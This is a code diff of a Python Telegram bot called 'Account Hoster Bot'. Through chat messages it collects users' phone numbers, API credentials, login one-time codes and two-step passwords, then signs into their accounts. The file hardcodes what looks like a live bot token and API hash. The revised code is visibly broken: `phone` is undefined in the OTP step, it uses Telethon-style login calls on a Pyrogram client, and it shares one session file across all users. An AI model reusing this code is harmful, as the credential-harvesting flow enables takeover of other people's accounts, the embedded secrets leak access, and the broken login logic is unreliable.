@@ -1,109 +1,119 @@
 import logging
-import os
-import json
-from telethon import TelegramClient, errors
-from telethon.errors import SessionPasswordNeededError
-from telethon.tl.functions.messages import SendMessageRequest
-from telethon.tl.types import PeerUser
-from telethon.tl.functions.channels import LeaveChannelRequest
 from pyrogram import Client, filters
-from pyrogram.types import Message
+from pyrogram.errors import SessionPasswordNeeded
 
-# Setup logging for debugging
-logging.basicConfig(level=logging.DEBUG)
-logger = logging.getLogger(__name__)
-
-# Bot credentials (replace with actual)
-BOT_TOKEN = "8031831989:AAH8H2ZuKhMukDZ9cWG2Kgm18hEx835jb48"
+# Bot credentials (replace with your own)
 API_ID = 26416419
-API_HASH = "c109c77f5823c847b1aeb7fbd4990cc4"  # Your API hash from my.telegram.org
+API_HASH = "c109c77f5823c847b1aeb7fbd4990cc4"
+BOT_TOKEN = "8031831989:AAH8H2ZuKhMukDZ9cWG2Kgm18hEx835jb48"  # Replace with your bot's token
 
-CREDENTIALS_FOLDER = 'sessions'
+# Setup logging to suppress unwanted output
+logging.basicConfig(level=logging.ERROR)  # Suppress INFO/DEBUG logs
 
-# Create a session folder if it doesn't exist
-if not os.path.exists(CREDENTIALS_FOLDER):
-    os.mkdir(CREDENTIALS_FOLDER)
+# Initialize the Pyrogram client (bot)
+bot = Client("account_hoster_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
-def save_credentials(session_name, credentials):
-    path = os.path.join(CREDENTIALS_FOLDER, f"{session_name}.json")
-    with open(path, 'w') as f:
-        json.dump(credentials, f)
+# Define a state to track user progress (we'll keep this simple)
+user_sessions = {}
 
-def load_credentials(session_name):
-    path = os.path.join(CREDENTIALS_FOLDER, f"{session_name}.json")
-    if os.path.exists(path):
-        with open(path, 'r') as f:
-            return json.load(f)
-    return {}
+@bot.on_message(filters.command("start"))
+async def start_message(client, message):
+    await message.reply("Welcome to the Account Hoster Bot! Please use /host to begin the login process.")
 
-# Initialize the bot client
-bot = Client("bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
-
-# /host command: Starts the hosting process for a new account
 @bot.on_message(filters.command("host"))
-async def host_command(client, message: Message):
-    """Starts the hosting process for a new account."""
+async def host_account(client, message):
+    user_id = message.from_user.id
+    if user_id in user_sessions:
+        await message.reply("You already have an active session!")
+        return
 
-    # Ask for phone number
-    await message.reply("Please enter your **phone number** (with country code):")
+    # Start the hosting process
+    user_sessions[user_id] = {"step": "waiting_for_phone"}
+    await message.reply("Please send your phone number (with country code):")
 
-    # Wait for the phone number input from the user
-    phone_msg = await bot.listen(message.chat.id)
-    phone_number = phone_msg.text.strip()
+@bot.on_message(filters.text)
+async def handle_input(client, message):
+    user_id = message.from_user.id
+    if user_id not in user_sessions:
+        return
 
-    # Load saved credentials or ask for new credentials
-    session_name = f"session_{phone_number}"
-    credentials = load_credentials(session_name)
+    step = user_sessions[user_id]["step"]
 
-    if credentials:
-        await message.reply(f"Using saved credentials for {phone_number}.")
-        api_id = credentials['api_id']
-        api_hash = credentials['api_hash']
-        phone_number = credentials['phone_number']
-    else:
-        await message.reply("Enter API ID and API Hash for your account.")
-        api_id = int(await bot.listen(message.chat.id))
-        api_hash = await bot.listen(message.chat.id)
-        
-        credentials = {
-            'api_id': api_id,
-            'api_hash': api_hash,
-            'phone_number': phone_number
-        }
-        save_credentials(session_name, credentials)
+    # Step 1: Get phone number
+    if step == "waiting_for_phone":
+        user_sessions[user_id]["phone"] = message.text.strip()
+        user_sessions[user_id]["step"] = "waiting_for_api_id"
+        await message.reply("Please send your API ID:")
 
-    # Create Telethon client instance
-    user_client = TelegramClient(session_name, api_id=api_id, api_hash=api_hash)
+    # Step 2: Get API ID
+    elif step == "waiting_for_api_id":
+        try:
+            user_sessions[user_id]["api_id"] = int(message.text.strip())
+            user_sessions[user_id]["step"] = "waiting_for_api_hash"
+            await message.reply("Please send your API Hash:")
+        except ValueError:
+            await message.reply("Invalid API ID! Please send a valid API ID:")
 
-    try:
+    # Step 3: Get API Hash
+    elif step == "waiting_for_api_hash":
+        user_sessions[user_id]["api_hash"] = message.text.strip()
+        user_sessions[user_id]["step"] = "waiting_for_otp"
+        await message.reply("Thank you! Now, I will send an OTP to your phone number. Please wait...")
+
+        # Initialize the user client for login
+        phone = user_sessions[user_id]["phone"]
+        api_id = user_sessions[user_id]["api_id"]
+        api_hash = user_sessions[user_id]["api_hash"]
+
+        user_client = Client("user_session", api_id=api_id, api_hash=api_hash)
         await user_client.connect()
-        
-        # Check if user is authorized
-        if not await user_client.is_user_authorized():
-            await user_client.send_code_request(phone_number)
-            await user_client.sign_in(phone_number)
 
-        # Handle two-factor authentication
-        if not await user_client.is_user_authorized():
-            await message.reply("Two-factor authentication is enabled. Please enter your password:")
-            password_msg = await bot.listen(message.chat.id)
-            password = password_msg.text.strip()
+        try:
+            # Send OTP request
+            await user_client.send_code_request(phone)
+            user_sessions[user_id]["user_client"] = user_client
+            user_sessions[user_id]["step"] = "waiting_for_otp"
+            await message.reply("OTP sent! Please enter the OTP you received:")
+
+        except Exception as e:
+            await message.reply(f"Error sending OTP: {str(e)}")
+            del user_sessions[user_id]
+            await user_client.disconnect()
+
+    # Step 4: Get OTP and log in
+    elif step == "waiting_for_otp":
+        otp = message.text.strip()
+        user_client = user_sessions[user_id].get("user_client")
+
+        try:
+            # Log in using OTP
+            await user_client.sign_in(phone, otp)
+            await message.reply("Successfully logged in!")
+            del user_sessions[user_id]
+            await user_client.disconnect()
+
+        except SessionPasswordNeeded:
+            await message.reply("Two-step verification enabled. Please enter your password:")
+            user_sessions[user_id]["step"] = "waiting_for_password"
+        except Exception as e:
+            await message.reply(f"Login failed: {str(e)}")
+            del user_sessions[user_id]
+            await user_client.disconnect()
+
+    # Step 5: Handle password if 2FA is enabled
+    elif step == "waiting_for_password":
+        password = message.text.strip()
+        user_client = user_sessions[user_id].get("user_client")
+
+        try:
             await user_client.sign_in(password=password)
-
-        await message.reply("Successfully logged in!")
-
-    except SessionPasswordNeededError:
-        await message.reply("Two-factor authentication is enabled. Please enter your password:")
-        password_msg = await bot.listen(message.chat.id)
-        password = password_msg.text.strip()
-        await user_client.sign_in(password=password)
-
-    except Exception as e:
-        logger.error(f"Login failed: {e}")
-        await message.reply(f"Login failed: {e}")
-
-    finally:
-        await user_client.disconnect()
+            await message.reply("Successfully logged in after password verification!")
+            del user_sessions[user_id]
+            await user_client.disconnect()
+        except Exception as e:
+            await message.reply(f"Password verification failed: {str(e)}")
+            del user_sessions[user_id]
+            await user_client.disconnect()
 
 # Run the bot
 bot.run()
